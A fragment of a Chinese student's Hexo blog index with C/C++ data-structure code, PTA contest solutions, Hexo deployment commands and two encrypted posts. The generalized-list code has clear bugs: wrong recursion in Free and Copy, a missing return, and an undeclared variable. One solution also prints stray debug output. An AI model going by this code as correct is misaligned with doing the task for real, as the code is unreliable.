  <script id="hbeData" type="hbeData" data-hmacdigest="8db3def65c2c103b37c2fccc5628aa987bb734145169f751ff9da0b8a6d0e6df">d4155f2e349f5b8b303096873299bda71c5f872025d3fcbf90fe8dc10fe11cba8db02d9f32763d2016f2091a1503def315b5df2d4eb6348fb24ea40b45ec5af5f6f61a300cb4651d5810f27648551562ebd330614f0c19abd4d7d15ffda7d61f5ee0b2c529f281018e020523a7e612c8cfd94a480f412d44a7c71d7128065f8595e2be241a3213cced1550fc82c086f13eb995c293a8542bf67c533c1a263160d710feeb8e7e1c5750a04f41aaa4e9fa3b7877240e041c0d1d0179652ec249307293e2e9c060d251994a2407cfe912fa7d1c1aaf4a53eb053693e64ce5eec230cd7fbc39afd9371ca5a7ce1de69d8a9ec1259f1c544bd635ea1fac635fbd57a2ffc10c37478c7f43b98aee898c8f642c9811dd7e0de570bc5ea4c54b902d4abbd3c9f8942bcceb8527490fa2d0cb01a6fdb8e00291a37b8ab96d4181f5d4e9690d1d6625948552c0901c137369af5035a7ac16d9005a4c663276d3824fdc1338ef5d15da3f692a253eb24f7fdab7ad0a0cfd454cee2fc5bdbea629fdba0898f7</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>广义表定义及其实现</title>
    <url>/2020/10/17/%E5%B9%BF%E4%B9%89%E8%A1%A8%E5%AE%9A%E4%B9%89%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<p>广义表定义及其实现</p>
<a id="more"></a>
<pre class="line-numbers language-none"><code class="language-none">#include&lt;iostream&gt;
#include&lt;cstring&gt;
#include&lt;stdlib.h&gt;
using namespace std;

class GListNode &#x2F;&#x2F;广义表结构
&#123;
    public:
    int type;
    union
    &#123;
        char data;
        GListNode * sublist;
    &#125;;
    GListNode *next;
&#125;;
class GList
&#123;public:
    GListNode *head; &#x2F;&#x2F;头指针
    GListNode *DoCreate(char s[],int &amp;i);&#x2F;&#x2F;创建广义表
    GListNode *Copy(GListNode *p);&#x2F;&#x2F;复制广义表
    void Traverse(GListNode *p);&#x2F;&#x2F;遍历广义表
    void Free(GListNode *p);&#x2F;&#x2F;释放广义表
    int Depth(GListNode *p);&#x2F;&#x2F;返回广义表深度

    GList();&#x2F;&#x2F;创建广义表
    GList(char s[]);
    GList(GList &amp;gl);
    ~GList();
    void Traverse();
    int Length();&#x2F;&#x2F;广义表长度

&#125;;
GList::GList()
&#123;
    head&#x3D;new GListNode;
    head-&gt;type&#x3D;1;
    head-&gt;sublist&#x3D;head-&gt;next&#x3D;NULL;
&#125;
GListNode * GList::DoCreate(char s[],int &amp;i)
&#123;
    GListNode *p;
    while(s[i]&#x3D;&#x3D;&#39; &#39;||s[i]&#x3D;&#x3D;&#39;,&#39;)
        i++;
    char e&#x3D;s[i];
    i++;
    if(e&#x3D;&#x3D;&#39;(&#39;)
    &#123;
        p&#x3D;new GListNode;
        p-&gt;type&#x3D;1;
        p-&gt;sublist&#x3D;DoCreate(s,i);
        p-&gt;next&#x3D;DoCreate(s,i);
        return p;
    &#125;
    if(e&#x3D;&#x3D;&#39;)&#39;||e&#x3D;&#x3D;&#39;\0&#39;)
    &#123;
        return NULL;
    &#125;
    p&#x3D;new GListNode;
    p-&gt;type&#x3D;0;
    p-&gt;data&#x3D;e;
    p-&gt;next&#x3D;DoCreate(s,i);
    return p;
&#125;
GList::GList(char s[])
&#123;
    int i&#x3D;0;
    head&#x3D;DoCreate(s,i);
&#125;
void GList::Traverse(GListNode *p)
&#123;
    if(p&#x3D;&#x3D;NULL)
    return ;
    if(p-&gt;type&#x3D;&#x3D;0)
    cout&lt;&lt;p-&gt;data;
    else
    &#123;
        cout&lt;&lt;&quot;(&quot;;
        Traverse(p-&gt;sublist);
        cout&lt;&lt;&quot;)&quot;;
    &#125;
    if(p-&gt;next)
        cout&lt;&lt;&quot;,&quot;;
    Traverse(p-&gt;next);
&#125;
void GList::Traverse()
&#123;
    Traverse(this-&gt;head);
&#125;
void GList::Free(GListNode * p)
&#123;
    if(p&#x3D;&#x3D;NULL)
        return ;
    if(p-&gt;type&#x3D;&#x3D;1)
        Free(p-&gt;next);
    Free(p-&gt;next);
    delete p;
&#125;
GList::~GList()
&#123;Free(head);&#125;
GListNode *GList::Copy(GListNode *p)
&#123;
    if(p&#x3D;&#x3D;NULL)
        return NULL;
    GListNode *newp&#x3D;new GListNode;
    newp-&gt;type&#x3D;p-&gt;type;
    if(p-&gt;type&#x3D;&#x3D;1)
        newp-&gt;sublist&#x3D;Copy(p-&gt;next);
    else
    &#123;
            newp-&gt;data&#x3D;p-&gt;data;
            newp-&gt;next&#x3D;Copy(p-&gt;next);
    return newp;
    &#125;
    
&#125;
int GList::Length()
&#123;
    GListNode *p;
    int n&#x3D;0;
    p&#x3D;head-&gt;sublist;
    while(p)
    &#123;
        p&#x3D;p-&gt;next;
        n++;
    &#125;
    return n;
&#125;
int GList::Depth(GListNode *p)
&#123;   
    if(p-&gt;type&#x3D;&#x3D;0)
    return 0;
    int maxdepth&#x3D;0;
    GListNode * q;
    q&#x3D;p-&gt;sublist;
    while(q)
    &#123;
        depth&#x3D;Depth(q);
        if(depth&gt;maxdepth)
            maxdepth&#x3D;depth;
        q&#x3D;q-&gt;next;
    &#125;
    return maxdepth+1;
&#125;
int main()
&#123;

    char s[200];
    cin&gt;&gt;s;
    GList gl(s);
    gl.Traverse();
    system(&quot;pause&quot;);
    return 0;

&#125;

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
  </entry>
  <entry>
    <title>7-11 玩转二叉树 (25分)</title>
    <url>/2020/10/15/7-11-%E7%8E%A9%E8%BD%AC%E4%BA%8C%E5%8F%89%E6%A0%91-25%E5%88%86/</url>
    <content><![CDATA[<p>7-11 玩转二叉树 (25分)<br>给定一棵二叉树的中序遍历和前序遍历，请你先将树做个镜面反转，再输出反转后的层序遍历的序列。所谓镜面反转，是指将所有非叶结点的左右孩子对换。这里假设键值都是互不相等的正整数。</p>
<a id="more"></a>
<pre class="line-numbers language-none"><code class="language-none">
输入格式：
输入第一行给出一个正整数N（≤30），是二叉树中结点的个数。第二行给出其中序遍历序列。第三行给出其前序遍历序列。数字间以空格分隔。

输出格式：
在一行中输出该树反转后的层序遍历的序列。数字间以1个空格分隔，行首尾不得有多余空格。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none"> 输入样例：
7
1 2 3 4 5 6 7
4 1 3 2 6 5 7
输出样例：
4 6 1 7 5 3 2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>1）先序遍历中第一个是根那么在中序遍历中找到根那么左右子树就确定了，所以自然左右子树的范围就确定了，所以在递归方法中先序遍历的左子树的边界范围是l1 + 1, l1 + i - l2</p>
</blockquote>
<blockquote>
<p>因为第一个是根所以下一次递归的时候应该是下一个位置，但是左子树应该在什么位置结束呢？我们可以通过中序遍历中左子树的范围进行确定，可以结合上面的例子进行理解，可以知道左子树的范围为l1 + (i - l2)</p>
</blockquote>
<blockquote>
<p>也可以这样想设先序遍历左子树结束位置为x，则x + 1- (l1 + 1) = i - l2，所以可以得到左子树的结束范围是 l1 + (i - l2)，对于中序遍历序列中当前左子树的范围应该是l2, i - 1（i为根所在的位置）</p>
</blockquote>
<blockquote>
<p>2）对于右子树来说，我们知道前序遍历的范围的起点应该是在前序遍历左子树结束位置上加1的位置，结束位置是在r1, 中序遍历中右子树的范围应该是i + 1, r2</p>
</blockquote>
<blockquote>
<p>我们可以模仿之前的递归创建完全二叉树的例子，可以将根节点的左指针指向递归创建的左子树，根节点的右指针指向递归创建的右子树即可</p>
</blockquote>
<blockquote>
<p>3）核心是其中的递归方法中参数的确定</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
typedef int ElementType;
typedef struct BiTNode&#123;
    ElementType data;
    struct BiTNode *lchild;
    struct BiTNode *rchild;
&#125;BiTNode,*BiTree;
BiTree CreatBinTree(int *pre,int *in,int l1,int r1,int l2,int r2 );
void invertTree(BiTree root);
void LevelorderTraversal( BiTree BT );
int main()
&#123;
        BiTree T;
	int prelist[1000];
	int inlist[1000];
	int length;
	&#x2F;*
	7
	1 2 3 4 5 6 7
	4 1 3 2 6 5 7
	*&#x2F;
	scanf(&quot;%d&quot;,&amp;length);
	for(int i&#x3D;0;i&lt;length;i++)
	&#123;
		scanf(&quot;%d&quot;,&amp;inlist[i]);
	&#125;
		for(int i&#x3D;0;i&lt;length;i++)
	&#123;
		scanf(&quot;%d&quot;,&amp;prelist[i]);
	&#125;
	T&#x3D;CreatBinTree(prelist,inlist, 0,length-1,0,length-1);&#x2F;&#x2F;注意是（0,length-1） 
    invertTree(T);
    LevelorderTraversal(T);
    return 0;
&#125;
void invertTree(BiTree root) &#123;&#x2F;&#x2F;反转
    if(root &#x3D;&#x3D; NULL)
    return ;
    BiTree p &#x3D; root;
    p &#x3D; root-&gt;lchild;
    root-&gt;lchild&#x3D; root-&gt;rchild;
    root-&gt;rchild &#x3D; p;
    invertTree(root-&gt;lchild);
    invertTree(root-&gt;rchild);
&#125;
void LevelorderTraversal( BiTree BT )
&#123;
	BiTree p;
	BiTree q[1004];
	int head&#x3D;0;int tail&#x3D;0;
	if(BT)
	&#123;
		q[tail++]&#x3D;BT;
	while(head!&#x3D;tail)
	&#123;
		p&#x3D;q[head++];
		printf(&quot; %d&quot;,p-&gt;data);
		if(p-&gt;lchild)
		&#123;
			q[tail++]&#x3D;p-&gt;lchild;
		&#125;
		if(p-&gt;rchild)
		&#123;
			q[tail++]&#x3D;p-&gt;rchild;
		&#125;
	&#125;
	&#125;
&#125;
BiTree CreatBinTree(int *pre,int *in,int l1,int r1,int l2,int r2 )
&#123;
	if(l1&gt;r1) return NULL;
	BiTree T;
	T&#x3D;(BiTree)malloc(sizeof(BiTNode));
	T-&gt;data&#x3D;pre[l1];
	int i;
	for(i&#x3D;l2;i&lt;r2;i++)
	&#123;
		if(in[i]&#x3D;&#x3D;pre[l1]) break;
	&#125;
	T-&gt;lchild&#x3D;CreatBinTree(pre, in, l1+1,l1+(i-l2),l2,i-1);
	T-&gt;rchild&#x3D;CreatBinTree(pre, in, l1+(i-l2)+1,r1,i+1,r2);
	return T;
&#125;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
  </entry>
  <entry>
    <title>7-5 排座位（25 分）</title>
    <url>/2020/10/15/7-5-%E6%8E%92%E5%BA%A7%E4%BD%8D%EF%BC%8825-%E5%88%86%EF%BC%89/</url>
    <content><![CDATA[<p>7-5 排座位（25 分）</p>
<blockquote>
<ul>
<li>布置宴席最微妙的事情，就是给前来参宴的各位宾客安排座位。无论如何，总不能把两个死对头排到同一张宴会桌旁！这个艰巨任务现在就交给你，对任何一对客人，请编写程序告诉主人他们是否能被安排同席。<br>输入格式：</li>
</ul>
</blockquote>
<a id="more"></a>
<blockquote>
<ul>
<li>输入第一行给出3个正整数：N（≤100），即前来参宴的宾客总人数，则这些人从1到N编号；M为已知两两宾客之间的关系数；K为查询的条数。随后M行，每行给出一对宾客之间的关系，格式为：宾客1 宾客2 关系，其中关系为1表示是朋友，-1表示是死对头。注意两个人不可能既是朋友又是敌人。最后K行，每行给出一对需要查询的宾客编号。</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>这里假设朋友的朋友也是朋友。但敌人的敌人并不一定就是朋友，朋友的敌人也不一定是敌人。只有单纯直接的敌对关系才是绝对不能同席的。<br>输出格式：</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>对每个查询输出一行结果：如果两位宾客之间是朋友，且没有敌对关系，则输出No problem；如果他们之间并不是朋友，但也不敌对，则输出OK；如果他们之间有敌对，然而也有共同的朋友，则输出OK but…；如果他们之间只有敌对关系，则输出No way。</li>
</ul>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">输入样例：

7 8 4
5 6 1
2 7 -1
1 3 1
3 4 1
6 7 -1
1 2 1
1 4 1
2 3 -1
3 4
5 7
2 3
7 2

输出样例：

No problem
OK
OK but…
No way<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<pre class="line-numbers language-none"><code class="language-none">#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;
#include&lt;string.h&gt;
#include&lt;queue&gt;
using namespace std;

int f[110];
int map[110][110];
void init(int n)
&#123;
    for(int i&#x3D;1;i&lt;&#x3D;n;i++)
    &#123;
        f[i] &#x3D; i;
    &#125;
&#125;
int getf(int v)
&#123;
    if(v &#x3D;&#x3D; f[v])
        return v;
    else
    &#123;
        f[v] &#x3D; getf(f[v]);
        return f[v];
    &#125;
&#125;
void Merge(int u,int v)
&#123;
    int t1 &#x3D; getf(u);
    int t2 &#x3D;getf(v);
    if(t1!&#x3D;t2)
    &#123;
        f[t1] &#x3D; t2;
    &#125;
&#125;
int main()
&#123;
    int n,m,t;
    int x,y;
    scanf(&quot;%d %d %d&quot;,&amp;n,&amp;m,&amp;t);
    init(n);
    int a,b,r;
    while(m--)
    &#123;
        scanf(&quot;%d %d %d&quot;,&amp;a,&amp;b,&amp;r);
        if(r &#x3D;&#x3D; 1)
        &#123;
            Merge(a,b);
        &#125;
        else
            map[a][b] &#x3D; map[b][a] &#x3D; 1;

    &#125;
    for(int i&#x3D;0;i&lt;t;i++)
    &#123;
        scanf(&quot;%d %d&quot;,&amp;x,&amp;y);
        int flag1&#x3D;0,flag2&#x3D;0;
        if(getf(x) &#x3D;&#x3D; getf(y))
            flag1 &#x3D; 1;
        if(map[x][y]||map[y][x])
            flag2 &#x3D; 1;
        if(flag1&amp;&amp;!flag2)
            printf(&quot;No problem\n&quot;);
        else if(flag1&amp;&amp;flag2)
            printf(&quot;OK but...\n&quot;);
        else if(!flag1&amp;&amp;flag2)
            printf(&quot;No way\n&quot;);
        else
        printf(&quot;OK\n&quot;);
    &#125;
    return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">利用“并查集”查找：
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;iostream&gt;
#include &lt;string.h&gt;
using namespace std;
    int zz[200];

int find_(int x)
&#123;
    if(x&#x3D;&#x3D;zz[x])
    return x;
    else
    &#123;
        zz[x]&#x3D;find_(zz[x]);
        return zz[x];
    &#125;
    
&#125;

void connect(int r1,int r2)
&#123;
    int x&#x3D;find_(r1);
    int y&#x3D;find_(r2);
    if(x!&#x3D;y)
    zz[x]&#x3D;y;

&#125;
int main()
&#123;   

    int renshu,tiaoshu,chashu;
    cin&gt;&gt;renshu&gt;&gt;tiaoshu&gt;&gt;chashu;
    int i,j,k,l,n,m,x,y,a,b;
    int r1,r2,gx;
    int cr[200][200];
    for(i&#x3D;1;i&lt;&#x3D;renshu;i++)
    zz[i]&#x3D;i;
    for(i&#x3D;0;i&lt;tiaoshu;i++)
    &#123;
        cin&gt;&gt;r1&gt;&gt;r2&gt;&gt;gx;
        if(gx&#x3D;&#x3D;1)
        &#123;
            connect(r1,r2);
        &#125;
        if(gx&#x3D;&#x3D;-1)
        &#123;
            cr[r1][r2]&#x3D;cr[r2][r1]&#x3D;1;
        &#125;
    &#125;
    for(i&#x3D;0;i&lt;chashu;i++)
    &#123;
        int f1&#x3D;0,f2&#x3D;0;
        cin&gt;&gt;r1&gt;&gt;r2;
        if(find_(r1)&#x3D;&#x3D;find_(r2))
        f1&#x3D;1;
        if(cr[r1][r2]||cr[r2][r1])
        f2&#x3D;1;
        if(f1&amp;&amp;!f2)
        cout&lt;&lt;&quot;No problem&quot;&lt;&lt;endl;
        if(!f1&amp;&amp;!f2)
        cout&lt;&lt;&quot;OK&quot;&lt;&lt;endl;
        if(f1&amp;&amp;f2)
        cout&lt;&lt;&quot;OK but...&quot;&lt;&lt;endl;
        if(!f1&amp;&amp;f2)
        cout&lt;&lt;&quot;No way&quot;&lt;&lt;endl;
    &#125;
    system(&quot;pause&quot;);
    return 0;
&#125;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
  </entry>
  <entry>
    <title>40周年大会心得</title>
    <url>/2020/10/14/40%E5%91%A8%E5%B9%B4%E5%A4%A7%E4%BC%9A%E5%BF%83%E5%BE%97/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">请输入密码，密码在LHL那.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="282ccbd75282384d367ce9db2ede95eac56e090908b3438224f16923af45853d">415f7218e6c24c69d0a68e5db038c42cc7c12368be0adbf2fa02df3a0e060f0edc1d5e77bce83bed9d5fb9edb8b8419ac6c0576af0dc50963c72fe664721377b3f8f535aed1a7220fe4a8501a3307a0dbeafec7a9b20f13296abef9ee2c3a7b92415baa67ca9e6739a5412899230d0177761a7d73d8e08bb6e723aa900c2d7cc45ffaaab502199179a48c56ef6310d267b1d0cbaa163da5b3a6f8f78bd19472f3d4b870a910dbf3af551cb3128bd3042638e9cdd6ada4794cbceb15fe4901f6b0d0d59543ca104f069988c17fba3e4cb7e081de15dcd435b353ac749c84aea26c997178bae7c8cf76e9da4d0abc52313bb2a49e3e925f0588f08e8b224d92ac5b13ed03fd0cd936d9d06a20d3f46b024ffce480338fa857a6b9b30e47ea493606ca62b67636f645a4c6b3074fb6af822468e982bdb2d89346496a4fa00816560933b9eae6c3ba9e2e9adb9df7afadfa1cc2ce18e15115c4d4a25c9b4bfe67979c8fa3aa6b649b5d69278d82732e401b6ce3c3b6359a9c3ce9080d12d12f191547a0845a501e2bf21db3887bab356925847cd508eb0521d9be24dc3e7d762d2b0a7d2376c5f52eb8f711b0a99d2372d5814638844125747ef0f6b30875780244cfe7e6d7c0041e1fcd66f7b2785aa0496ec77005e4fc6e96b9d937e984eb314be788e6d9f1eb9816902d6b981daff0437bb742ec92c56ea4227b69e699031a00045ba2f9e506b211c3d493a56c8e1938aceaee8bc9c34d4e1f13a9fd0abf2a1ec</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>2016年天梯赛初赛题集 7-1 到底有多二 (15分)</title>
    <url>/2020/10/13/2016%E5%B9%B4%E5%A4%A9%E6%A2%AF%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%A2%98%E9%9B%86-7-1-%E5%88%B0%E5%BA%95%E6%9C%89%E5%A4%9A%E4%BA%8C-15%E5%88%86/</url>
    <content><![CDATA[<p>7-1 到底有多二 (15分)</p>
<blockquote>
<p>一个整数“犯二的程度”定义为该数字中包含2的个数与其位数的比值。如果这个数是负数，则程度增加0.5倍；如果还是个偶数，则再增加1倍。例如数字-13142223336是个11位数，其中有3个2，并且是负数，也是偶数，则它的犯二程度计算为：3/11×1.5×2×100%，约为81.82%。本题就请你计算一个给定整数到底有多二。</p>
</blockquote>
<a id="more"></a>
<blockquote>
<p>输入格式：<br>输入第一行给出一个不超过50位的整数N。</p>
</blockquote>
<blockquote>
<p>输出格式：<br>在一行中输出N犯二的程度，保留小数点后两位。</p>
</blockquote>
<blockquote>
<p>输入样例：<br>-13142223336<br>输出样例：<br>81.82%</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">#include &lt;iostream&gt;
#include &lt;cstdlib&gt;
#include&lt;string&gt;
#include&lt;cstdio&gt;
using namespace std;
int main() &#123;
    string s;
    double bs1&#x3D;1;
    double bs2&#x3D;1;
    int weishu&#x3D;1;
    int ershu&#x3D;0;
    int fu&#x3D;0;
    double count&#x3D;0;
    cin&gt;&gt;s;
    int i&#x3D;0,j&#x3D;0;
    if(s[0]&#x3D;&#x3D;&#39;-&#39;)
    &#123;
        i++;
        bs1&#x3D;bs1+0.5;
        fu++;
    &#125;
    weishu&#x3D;s.length()-fu;
    for(;s[i]!&#x3D;&#39;\0&#39;;i++)
    &#123;
        if(s[i]&#x3D;&#x3D;&#39;2&#39;)
        ershu++;
    &#125;
    if((s[s.length()-1]-&#39;0&#39;)%2&#x3D;&#x3D;0)
    bs2&#x3D;bs2+1;
    double al&#x3D;(ershu*1.0&#x2F;weishu)*bs1*bs2*100;
    cout&lt;&lt;ershu&lt;&lt;&quot; &quot;&lt;&lt;weishu&lt;&lt;&#39; &#39;&lt;&lt;bs1&lt;&lt;&#39; &#39;&lt;&lt;bs2&lt;&lt;endl;
    printf(&quot;%.2lf&quot;,al);
    cout&lt;&lt;&quot;%&quot;&lt;&lt;endl;

    
    system(&quot;pause&quot;);
    return 0;
&#125;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
  </entry>
  <entry>
    <title>Bilibili 测试</title>
    <url>/2020/10/12/Bilibili-%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<a id="more"></a>
<div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;">
    <iframe src="//player.bilibili.com/player.html?aid=797471540&bvid=BV1Py4y1r7FL&cid=243821551&page=1"  scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; left: 0; top: 0;"></iframe>
</div>
]]></content>
  </entry>
  <entry>
    <title>第一篇搭建网站的文章</title>
    <url>/2020/10/12/LHL%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%BD%91%E7%AB%99/</url>
    <content><![CDATA[<pre><code>#安装Nodejs</code></pre>
<p>node -v    #查看node版本<br>npm -v    #查看npm版本<br>npm install -g cnpm –registry=<a href="http://registry.npm.taobao.org/">http://registry.npm.taobao.org</a>    #安装淘宝的cnpm 管理器</p>
<a id="more"></a>
<p>cnpm -v    #查看cnpm版本<br>cnpm install -g hexo-cli    #安装hexo框架<br>hexo -v    #查看hexo版本<br>mkdir blog    #创建blog目录<br>cd blog     #进入blog目录<br>sudo hexo init     #生成博客 初始化博客<br>hexo s    #启动本地博客服务<br><a href="http://localhost:4000/">http://localhost:4000/</a>    #本地访问地址<br>hexo n “我的第一篇文章” #创建新的文章<br>#返回blog目录<br>hexo clean #清理<br>hexo g #生成<br>#Github创建一个新的仓库 YourGithubName.github.io<br>cnpm install –save hexo-deployer-git #在blog目录下安装git部署插件</p>
<hr>
<h2 id="配置-config-yml"><a href="#配置-config-yml" class="headerlink" title="#配置_config.yml "></a>#配置_config.yml </h2><pre><code># Deployment
## Docs: https://hexo.io/docs/deployment.html
deploy:
      type: git
     repo: https://github.com/YourGithubName/YourGithubName.github.io.git
      branch: master</code></pre>
<hr>
<p>hexo d    #部署到Github仓库里<br><a href="https://yourgithubname.github.io/">https://YourGithubName.github.io/</a>  #访问这个地址可以查看博客</p>
<p> git clone <a href="https://github.com/litten/hexo-theme-yilia.git">https://github.com/litten/hexo-theme-yilia.git</a> themes/yilia  #下载yilia主题到本地</p>
<p>#修改hexo根目录下的 _config.yml 文件 ： theme: yilia</p>
<p>hexo c    #清理一下<br>hexo g    #生成<br>hexo d    #部署到远程Github仓库<br><a href="https://yourgithubname.github.io/">https://YourGithubName.github.io/</a>  #查看博客</p>
]]></content>
  </entry>
  <entry>
    <title>Gitee与GitHub网站上传的切换(C语言实现)</title>
    <url>/2020/10/12/Gitee%E4%B8%8EGitHub%E7%BD%91%E7%AB%99%E4%B8%8A%E4%BC%A0%E7%9A%84%E5%88%87%E6%8D%A2-C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<h3 id="原理如同两杯水的交换，需要通过第三者实现"><a href="#原理如同两杯水的交换，需要通过第三者实现" class="headerlink" title="原理如同两杯水的交换，需要通过第三者实现"></a>原理如同两杯水的交换，需要通过第三者实现</h3><a id="more"></a>
<p><img src="/photo/%E5%88%87%E6%8D%A2.png"><br>放在如下目录即可，每次需要用时即可切换<br>Github服务器在美国，国内访问可能会出现问题，Gitee则为国内网站，访问速度快，但每次修改需要重新部署</p>
<pre class="line-numbers language-none"><code class="language-none">#include &lt;iostream&gt;
#include &lt;string&gt;
#include &lt;cstdlib&gt;
 
int main(int argc, char *argv[])
&#123;
	std::string oldName, hName,eName,tName;
#ifdef _WIN32
	oldName &#x3D; &quot;C:\\Temp\\blog\\_config.yml&quot;;
	eName &#x3D; &quot;C:\\Temp\\blog\\_confige.yml&quot;;
	hName &#x3D; &quot;C:\\Temp\\blog\\_configh.yml&quot;;
	tName&#x3D; &quot;C:\\Temp\\blog\\_configt.yml&quot;;
#endif
 
	if (!rename(eName.c_str(), tName.c_str()))
	&#123;
		std::cout &lt;&lt; &quot;    准备更改为Gitee模式&quot;&lt;&lt; std::endl;
		if (!rename(oldName.c_str(), hName.c_str()))
			std::cout &lt;&lt; &quot;    副本更改为Github模式&quot;&lt;&lt; std::endl;
		else std::cout &lt;&lt; &quot;    副本更改为Github模式失败！&quot;&lt;&lt; std::endl;
		
		if (!rename(tName.c_str(), oldName.c_str()))
		std::cout &lt;&lt; &quot;    更改为Gitee模式成功！&quot;&lt;&lt; std::endl;
		else std::cout &lt;&lt; &quot;    rename error &quot;&lt;&lt; std::endl;
	&#125;
	else
	&#123;
		std::cout &lt;&lt; &quot;    rename error或更改为Github模式 &quot;&lt;&lt; std::endl;
		if (!rename(hName.c_str(), tName.c_str()))
		std::cout &lt;&lt; &quot;    准备更改为Github模式&quot;&lt;&lt; std::endl;
		else std::cout &lt;&lt; &quot;rename error &quot;&lt;&lt; std::endl;
		if (!rename(oldName.c_str(), eName.c_str()))
			std::cout &lt;&lt; &quot;    副本更改为Gitee模式&quot;&lt;&lt; std::endl;
		else std::cout &lt;&lt; &quot;    副本更改为Gitee模式失败！&quot;&lt;&lt; std::endl;
		
		if (!rename(tName.c_str(), oldName.c_str()))
		std::cout &lt;&lt; &quot;    更改为Github模式成功！&quot;&lt;&lt; std::endl;
